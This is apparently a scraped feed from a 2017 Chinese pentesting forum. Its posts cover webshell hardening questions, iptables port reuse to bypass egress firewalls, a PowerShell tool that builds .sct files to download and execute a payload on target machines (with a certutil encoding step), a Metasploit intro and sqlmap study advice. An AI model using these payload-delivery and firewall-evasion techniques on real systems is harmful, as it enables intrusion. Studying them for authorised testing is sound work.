<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 好的

<img src="https://file.xiaomiquan.com/8d/f6/8df6a4c90a9ec9e3b7d237bdd5b1798141a4dd962c04c0534de4fbe048cd1bc4.jpg" width="25px"/> __Y叔也叫段子手__: 小龙虾协议：没有什么是一顿小龙虾解决不了的，如果不行，那就两顿。(You just DO WHAT THE FUCK YOU WANT TO)😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/8d/f6/8df6a4c90a9ec9e3b7d237bdd5b1798141a4dd962c04c0534de4fbe048cd1bc4.jpg" width="25px"/> __Y叔也叫段子手__: 哈哈哈 666

<img src="https://file.xiaomiquan.com/d2/18/d218f1e1f6265c71a5b8590ca5f47d80f81ca4d5998c8fc968e01ad974e43fb0.jpg" width="25px"/> __trav__: 开源了 赞啊😋

<img src="https://file.xiaomiquan.com/d6/55/d6558b36cc52dd14bcae9f9a3ff02b7d980de0df97e5fef93bfdc01b1037dcd7.jpg" width="25px"/> __F0rever__: 能不能弄个小教程，不太会用

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/d6/55/d6558b36cc52dd14bcae9f9a3ff02b7d980de0df97e5fef93bfdc01b1037dcd7.jpg" width="25px"/> __F0rever__: 有点难弄 谁可以随便出个场景试试


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-25:

> 匿名用户 提问：
环境 WIN 2008 R2 SP1+IIS 7.5+.NET 4.5 如何利用IIS设置与磁盘权限设置来限制aspxspy类的webshell的功能比如限制他的获取服务器，用户，服务，注册表，以及其他信息进行提权.又能不影响正常的.net网站的使用。有没有什么好工具或姿势可以使用，谢谢大家。


之前和我私信过，我们暂无好的方式，熟悉这块的朋友可以交流看看。



...

<img src="https://file.xiaomiquan.com/59/46/59463c74099a7966bc6585d6104782f670abc10a7536be9c3f9dc22f49d361de.jpg" width="25px"/> __H3ro__: 看来win都不被看好

<img src="https://file.xiaomiquan.com/13/bb/13bb8383ae0416cdfc85176e9104a0c0fac33673fb005818e376f2579e91b3e4.jpg" width="25px"/> __技术小宅__: 权限设死一点不行么

<img src="https://file.xiaomiquan.com/59/46/59463c74099a7966bc6585d6104782f670abc10a7536be9c3f9dc22f49d361de.jpg" width="25px"/> __H3ro__ replies to <img src="https://file.xiaomiquan.com/13/bb/13bb8383ae0416cdfc85176e9104a0c0fac33673fb005818e376f2579e91b3e4.jpg" width="25px"/> __技术小宅__: 权限很多地方只能是禁止写 无法禁止读取 而且很多项没有对应的限制地方

<img src="https://file.xiaomiquan.com/13/bb/13bb8383ae0416cdfc85176e9104a0c0fac33673fb005818e376f2579e91b3e4.jpg" width="25px"/> __技术小宅__ replies to <img src="https://file.xiaomiquan.com/59/46/59463c74099a7966bc6585d6104782f670abc10a7536be9c3f9dc22f49d361de.jpg" width="25px"/> __H3ro__: 不是太懂你指的什么，我们可以私聊探讨一下


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-25:


__#资源#__

  好书推荐之《黑客秘笈——渗透测试实用指南（第2版）》

第一版刚出我就过了一遍，然后做了推荐，第二版内容更多更新，同样很推荐。

无论是玩渗透，组红队，打 CTF，都可以看这本书，方方面面作为渗透的入门还是不错的。

包括：相关渗透环境的搭建、情报收集、漏扫、漏洞利用、Web 渗透、内网渗透、社会工程学、物理攻击、免杀、破解、绕过、相关资源。

哈哈，这其实也像我的那个安全技能树（我的偏工程化），如果真的认真研读我分享的技能树，我想你应该会真的开窍。

成为实战派吧！JUST DO IT!

<img src="https://images.xiaomiquan.com/Fs_3rlL9MCZfd30lMh2oL3aXbmp5?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:0fnfUSVDLRtsgQYn6leiAgknHso=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 果断当当

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 果断当当

<img src="https://file.xiaomiquan.com/55/9c/559cd6ab0d53cede33572e8e5db8b7e82962f69e136838a2a81ae1ec04bf0859.jpg" width="25px"/> __右脸微笑__: 已入✌️

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 当当😄

<img src="https://file.xiaomiquan.com/d5/51/d5511dca91efbec5379a3a46988d102192a8fc0d4fd274c7a9a1e895e244eaf5.jpg" width="25px"/> __木木__: 亚马逊满100-20😜

<img src="https://file.xiaomiquan.com/80/c3/80c3a6e8cc93c7e3dbf226a5b6a14ff7c5ad6da0fbda3b51939c7efec01bbcb3.jpg" width="25px"/> __😍😡-ToSimp__: 😂，现在才看到，下手买了，哈哈

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 如果我问谁有pdf，你们会不会觉得我很穷？

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 漏洞盒子商城有😏

<img src="https://file.xiaomiquan.com/b7/23/b7233c3674fed3e47eba864801d8728b822ae7e2548ea84e02ee526869bb380a.jpg" width="25px"/> __炽凌__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 我也是想PDF😂


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-06-24:


__#姿势#__

  当服务器只开web服务并且防火墙不准服务器对外主动发起链接时，这样来突破！

当我在渗透测试的时候，拿到了web shell可以执行命令时，总想反弹shell出来方便进一步渗透，但是我碰到的环境安全性都做的很好，防火墙策略直接禁止服务器对外发起链接。这样就没法反弹了。

然后我自己有想过突破的方法，我当时想到的是重新封装http的数据包，到服务器后再拆包，转到22端口上去，这样做很复杂，一直没去实现。

今天在freebuf看到这篇文章，就忍不住转过来分享一下，作者在服务器上直接对源端口进行检查，然后将特定的源端口数据通过iptables nat表中PREROUTING 链配合 REDIRECT 重定向到本机22端口去，当时怎么没想到。这个在一些防火墙策略做的很完善的环境下，很有用！

[远程遥控IPTables进行端口复用](http://mp.weixin.qq.com/s/W5npN8YiqG-RBoq2mTv_2g)





...

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 好东西

<img src="https://file.xiaomiquan.com/aa/92/aa92e2c3d6ac0eb9816c67054b3a807b5777e27378713a78a6591b7d0e9a35f7.jpg" width="25px"/> __过客__: 这个厉害


...

---

<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ on 2017-06-24:

.sct generator by Moriarty@DMZLab
这是我闲着蛋疼用powershell 写的一个GUI小程序，功能主要是用来生成.sct文件。发这DD的目的主要是给大家介绍一下另一种方式来写GUI程序———Form（窗体）。用这种方式可以仅仅只需要powershell studio一个IDE就可以完成，在写一些简单的GUI的程序尤其适合。
那么程序本身的功能很简单，就是用来生成.sct文件，这个类型的文件想必好多朋友都已经了解，subtee牛已经详细阐述过了。我一般用它下载执行exe文件的时候居多，用法如下：
1.用certutil.exe(win7以上系统自带）将exe转成shellcode，格式如下：
certutil.exe -encode setup.exe setup.b64
2.将setup.b64的内容复制黏贴到中间输入框中，然后点击Generate即可生成一个随机命名的.sct文件。
3.将这个文件放到一个web server上，然后用程序中给出的一句话在目标机器上执行，即可完成exe的下载并执行。
程序中的refresh可以重新初始化所有参数（主要是重新生成一些随机的命名），clear会清空中间输入框中的内容。
如果你想生成其它功能的.sct文件，可以双击第一个文本框和第三个文本框使之变为可修改状态，就可以定制自己的sct文件了。
工具虽小，但我里面用了一些小技巧，你在阅读源码的时候应该就会注意到了。另外，写得仓促，可能有错误或者需要改进的地方，圈友们可自行修改。

<img src="https://images.xiaomiquan.com/Fvb1uk0UNtTW4QO5ztFWnIhekvWg?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:WCbccaAneV-SSm2aQD_ttO-v1IM=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fkr-fsE9IHqeL1mLm1clvDYlA_uF?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:BmcsH54WipZgXlwsaGngF9B6qh0=" width="50%" height="50%" align="middle"/>

__分享文件:__
[SctGenerator.zip](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: PowerShell 系列😏

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 这个我喜欢


...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-06-23:

#工具# #预告#
Metasploit是一款开源的渗透测试框架，自从它问世，仿佛人人都可以成为一名黑客。当然Metasploit之所以能成为最优秀的黑客工具，不只因为它命令满屏幕飞的逼格，更因为其有着令人难以置信的安全检测和漏洞利用功能。尤其在内网渗透中，更是无往而不利。在接下来，我将以Metasploit为基础，向大家分享内网渗透相关的知识
>Metasploit
项目地址：
[GitHub - rapid7/metasploit-framework: Metasploit F...](https://github.com/rapid7/metasploit-framework)


安装方法：
[Setting Up a Metasploit Development Environment · ...](https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment)



个人在渗透测试的时候，一般选择在VPS上搭建MSF（推荐，本圈前面有提），系统喜欢Ubuntu
如果嫌麻烦，也可以直接在本地用VMware安装kali2.0，自带msf。kali2.0安装方法：
[虚拟机安装kali2.0_百度经验](http://jingyan.baidu.com/article/93f9803f04e292e0e46f5533.html)





...

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 虚拟机的msf是不能外网渗透的吗？必须要外网环境才可以吗？（不是反弹shell那种，就单纯的像蓝屏攻击那种）

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 我好像没有理解到你的意思，这么说吧，无论你的msf搭在什么地方，只要可以让msf能访问到目标机器，直接访问也好，端口转发也好，socks代理也好，就能使用。你可以再具体描述一下情境

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 是不是不太会用虚拟机？

<img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 反弹shell需要外网IP我懂yy

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 对呀 就是我msf攻击虚拟机可以成功 攻击外网的没有打布丁的服务器不行 提示什么连不上rdp服务 但是3389开了的   不知道是exp不行还是网络问题😤

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 有防火墙吧

<img src="https://file.xiaomiquan.com/23/4f/234f71233cd7de9621f81fe36111b6a6cfe6a0292ea1aab5051ee0ae911c9e50.jpg" width="25px"/> __无意__: 我在centos7上装msf，装了一天都没装上，心都碎了

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ replies to <img src="https://file.xiaomiquan.com/23/4f/234f71233cd7de9621f81fe36111b6a6cfe6a0292ea1aab5051ee0ae911c9e50.jpg" width="25px"/> __无意__: 慢慢装(～o～)Y


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-23:

> 匿名用户 提问：
余弦大大，粉您很久啦。个人非常想实现一款扫描器(基于python)，想请教一哈有木有好的框架可以去参考，知道创宇研发的扫描器参考哪种呀？


刚刚不是发了？



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 补充下，知道创宇的扫描器基本没参考什么，但是会和优秀的去对比，比如 AWVS 这类商业级的

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 给大大点赞


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-23:

> 匿名用户 提问：
余弦大大，粉您很久啦。个人非常想实现一款扫描器(基于python)，想请教一哈有木有好的框架可以去参考，知道创宇研发的扫描器参考哪种呀？


刚刚不是发了？



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 补充下，知道创宇的扫描器基本没参考什么，但是会和优秀的去对比，比如 AWVS 这类商业级的

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 给大大点赞


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-23:


__#经验#__

  编程的重要性之 sqlmap 源码

下面这段话我曾经分享过，这里再贴一次。

1. 首先你应该搞懂它的架构体系，模块与分层，设计模式等。说白了，你得懂软件工程。

我为什么会在技能表里特别推荐读它的源码，绝不仅它的 SQL 注射能力一流，还因为它的软件工程牛逼到不行。你可以想象下，能打造如此稳定的框架工具已经不是件简单的事。如果你深入下去就会发现里面处处是软件工程那些优秀思想，关于这点比起曾经的 w3af 不知道要牛逼多少倍，后来 w3af 卧薪尝胆搞了次重写，才有现在的地位。

这个软件工程举些具体的点吧，比如并发，如果你连什么是并发，什么是线程、锁、条件、信号、超时、异常等概念都不懂；再复杂点并发里进程、线程、协程的差异是什么；再再复杂点 Python GIL、垃圾回收、性能陷阱；再再再复杂点 Python 那些内置模块、第三方模块的 ugly 点的 hack，看到这些源码你估计会哭死…哦，对了，如果你并不熟 Python，那么那些 Pythonic 的技巧估计也会让你怀疑自己、怀疑世界…

说的题外话：如果你把 sqlmap 当产品来读，还能读出更多东西；如果你把 sqlmap 当作开源社区运作模式来读，又能读出更多东西。如果不是因为它的开源运作、产品、软件工程、SQL 注射的一流，我们也不会持续用它并提交贡献代码与 Bugs 反馈。

正因为这种优秀，你要读的东西可多了，当然难！

2. 要吃透 sqlmap，还有一个非常关键的是，熟练 SQL 注射各类技术与技巧，熟练基于 SQL 的后续渗透技巧，sqlmap 支持几乎所有主流数据库的注射。

这又是一大难题。如果你不熟悉，你绝对想不到它为什么那样发包，为什么那样处理…

哦，对了，如果你并不是一名渗透手，你绝对难以思考到为什么 sqlmap 集成了那一堆技巧。

3. 虽然有人写了些小而美的工具来比拼 sqlmap 的一些不足，但还是向 sqlmap 致敬，他们在不断改进。

以上是我从事黑客工程化数年经验的一些回馈。不用怕，啃久了自然熟。

最后，./sqlmap.py -h 开启一个纵深知识领域吧:)



...

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 大赞啊赞，余大求教下，除了w3af还有木有性能好的扫描器源码可以研读的啊？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 哪类扫描器

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: web漏洞扫描呢。github上商用的真不多

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: Wapti也不错 不过不怎么更新了，w3af首推参考

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 看w3af时发现kali里面还有个叫nikto，不过貌似是个人项目

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 还有一个就是owasp-zap，也是kali自带

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 从哪个版本看呢

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 最新

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: nikto太老了

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 期待

<img src="https://file.xiaomiquan.com/59/51/5951d4e58f300c77c694d102186da5cca79e17dc6ba43fc529c330cd75005c2c.jpg" width="25px"/> __请添加备注__: 目前已深知读源码的好处，但读代码应该从哪里读，按怎样的顺序读？有什么读的技巧或者分析的方法？需要用什么工具辅助还是文本编辑器就可以？需要把一门语言学精通了再读？还是可以边查边学来读？零基础怎么读？只在学校上课学过一点的怎么读？求大佬指点

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/59/51/5951d4e58f300c77c694d102186da5cca79e17dc6ba43fc529c330cd75005c2c.jpg" width="25px"/> __请添加备注__: 过些天单独发这方面经验

<img src="https://file.xiaomiquan.com/88/74/8874c2e75dca87eba12d12a4c6f9a0b794ad3acffe3e26e4bb4bf3443a32db2e.jpg" width="25px"/> __GUO__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 同问


...

---

<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ on 2017-06-22:

今天又有人私信问我，我的学习、开发环境怎么搭的。之前这个问题也有人问过我了，我觉得这个问题很难回答。萝卜青菜各有所爱，每个人的开发环境，学习环境都不一样。不过既然这么多人问我了，那我就简单说一下，贴几张图供大家参考好了。首先说下系统，我是习惯用mac系统了，习惯了就改不了了。但是windows系统我也用，但都是在虚拟机里。虚拟机系统，parallel、vmware、virtual box我都用，你问我为什么？强迫症😨mac系统下的开发环境我一般都是jetbrains IDE一套（python、ruby、php、datagrip、intelliJ）+visual code+sublime text3+vim，你问我为啥装这么多？还是强迫症😁，调试的话，如果是脚本类的我就是直接mac系统下的docker+IDE。如果是win相关的（powershell、vc、汇编等），我有专门开发用的win虚拟机。（如附图）。我最常用的虚拟机有6个，4个用于渗透测试用（kali+backbox+parrot+win2008），2个用于开发用（win2008+win xp）。
至于学习环境，这个真的因人而异了。我最常用的，用过mac系统的圈友应该都听说过的，mac系统最好没有之一的Quiver，它非常强大，不仅可以用来收集各种代码（支持上百种语言），还支持多种格式的文章收集。用mac系统的，我强烈推荐一下了。其它的我就不废话了，大家看图学画😌
其实，环境搭建可以参考别人的，但最终还是要根据自己的实际情况、个人喜好去打造属于自己的环境，原样照搬我觉得不可取😁

<img src="https://images.xiaomiquan.com/FsGqMQu7abZ35kugBeMNs0bGLujj?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:zr_a5AE79eCys5ZH18YnzYoL44g=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fm-c5uhzat4fYTqmOTQMv2Jp6K0W?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:-ua6sUU8pZYbN7xWAdUG1O0ONuI=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FjavIxky9hMp1AdEWWl3kWlOMs6q?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:s7qgEKeSnt3Ofea93A8HZcJSQvc=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FmVfQXQIJ7FYT43NbTLhHTjAP2xx?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:7JnWYfsnAxjlnNppkHfJydGxabk=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fh6-tHvHOsI6R-g98VjmlDtqQAZO?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Sokpf3tp4hkyIO36Y0YdPt_ghhE=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FrzShsYa2Tl_yd7bqBlhml5qbovK?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:zs7SVIw_8IXYMZQAecO8ajOw_00=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 厉害，而且豪

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: dell2414，壕

<img src="https://file.xiaomiquan.com/b2/27/b2273c727cd42d41352bd2bb195a82e4d41270073f0e99e7e46ffb1a1566c21f.jpg" width="25px"/> __。__ replies to <img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 很多人都用这个……

<img src="https://file.xiaomiquan.com/32/ba/32ba2c03224e4ae7003702db4a3e3eb49b9745fa24b21af31ea9d982f42b005e.jpg" width="25px"/> __Denny__: 这是几台主机😂

<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ replies to <img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 晕……你只看1000多块钱的显示器，却不看我顶配的new mac pro，虽然我不是土豪，但是我表示很尴尬😅

<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ replies to <img src="https://file.xiaomiquan.com/32/ba/32ba2c03224e4ae7003702db4a3e3eb49b9745fa24b21af31ea9d982f42b005e.jpg" width="25px"/> __Denny__: 一个笔记本外接两个显示器而已

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: mac默认省了鼠标一枚，搭配vim，飞起😄

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__ replies to <img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__: 😨

<img src="https://file.xiaomiquan.com/0f/bc/0fbc3f3008299f4183024f5389829c93a200435e35e86ace2ffc5032fbffc774.jpg" width="25px"/> __S1m00n__: 顶配的MBP啊，壕！

<img src="https://file.xiaomiquan.com/32/3c/323c9df4ddcbf4793ab36832e291f0152cd94181245c43958f190ca74d7098f3.jpg" width="25px"/> __Royal.__: 竟然没用Alfred

<img src="https://file.xiaomiquan.com/e0/0f/e00f18f0f3a9e5740405160d8ac8cbd0fb7eb1eb5e3ff420f5a322c4f07f3c86.jpg" width="25px"/> __Burn__ replies to <img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 16G内存要不够了

